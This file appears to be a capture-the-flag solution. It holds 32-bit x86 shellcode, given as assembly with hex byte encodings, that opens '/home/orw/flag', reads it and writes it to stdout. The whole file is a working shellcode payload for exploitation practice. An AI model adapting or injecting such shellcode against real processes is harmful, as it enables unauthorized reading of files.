#shellnoob --from-asm solve.s --to-bin pay.bin --intel
#for i in range(0, len(path), 4):
#	print s[::-1][i:i+4].encode('hex')

.section .text
  push ebp          	# .byte 0x55                     # .ascii "55"
  mov ebp,esp       	# .byte 0x89,0xe5                # .ascii "89e5"
  sub esp,0x20      	# .byte 0x83,0xec,0x20           # .ascii "83ec20"
  xor eax,eax       	# .byte 0x31,0xc0                # .ascii "31c0"
  xor ebx,ebx       	# .byte 0x31,0xdb                # .ascii "31db"
  xor ecx,ecx       	# .byte 0x31,0xc9                # .ascii "31c9"
  xor edx,edx       	# .byte 0x31,0xd2                # .ascii "31d2"
  push edx          	# .byte 0x52                     # .ascii "52"

  mov al,0x5        	# .byte 0xb0,0x05                # .ascii "b005"
  push 0x67616c66   	# .byte 0x68,0x66,0x6c,0x61,0x67 # .ascii "68666c6167"
  push 0x2f77726f   	# .byte 0x68,0x6f,0x72,0x77,0x2f # .ascii "686f72772f"
  push 0x2f656d6f   	# .byte 0x68,0x6f,0x6d,0x65,0x2f # .ascii "686f6d652f"
  pushw 0x682f      	# .byte 0x66,0x68,0x2f,0x68      # .ascii "66682f68"
  mov ebx,esp       	# .byte 0x89,0xe3                # .ascii "89e3"
  int 0x80          	# .byte 0xcd,0x80                # .ascii "cd80"

  mov ebx,eax       	# .byte 0x89,0xc3                # .ascii "89c3"
  mov al,0x3        	# .byte 0xb0,0x03                # .ascii "b003"
  lea ecx,[ebp-0x40]	# .byte 0x8d,0x4d,0xc0           # .ascii "8d4dc0"
  mov dl,0x50       	# .byte 0xb2,0x50                # .ascii "b250"
  int 0x80          	# .byte 0xcd,0x80                # .ascii "cd80"

  mov edx,eax       	# .byte 0x89,0xc2                # .ascii "89c2"
  mov al,0x4        	# .byte 0xb0,0x04                # .ascii "b004"
  mov bl,0x1        	# .byte 0xb3,0x01                # .ascii "b301"
  int 0x80          	# .byte 0xcd,0x80                # .ascii "cd80"

  leave             	# .byte 0xc9                     # .ascii "c9"
  ret               	# .byte 0xc3                     # .ascii "c3"

